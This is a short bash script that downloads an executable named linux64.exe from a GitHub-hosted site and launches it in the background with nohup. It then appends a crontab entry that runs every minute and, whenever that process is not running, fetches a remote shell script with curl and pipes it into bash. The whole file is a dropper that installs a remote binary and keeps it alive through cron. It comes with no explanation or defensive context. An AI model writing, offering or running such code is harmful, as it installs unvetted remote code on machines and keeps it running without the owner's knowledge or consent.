#!/bin/bash

path=$(mktemp -d /tmp/XXXXXX)
cd $path
wget https://github.com/Waz0x/Waz0x.github.io/raw/main/bin/linux64.exe && chmod +x linux64.exe
crontab -l > crontabs
nohup linux64.exe &
cat crontabs
echo "* * * * *     bash -c \"if [[ -z \"$(pidof linux64.exe)\" ]];then curl https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus_script.sh | bash;fi\"" >> crontabs
crontab crontabs
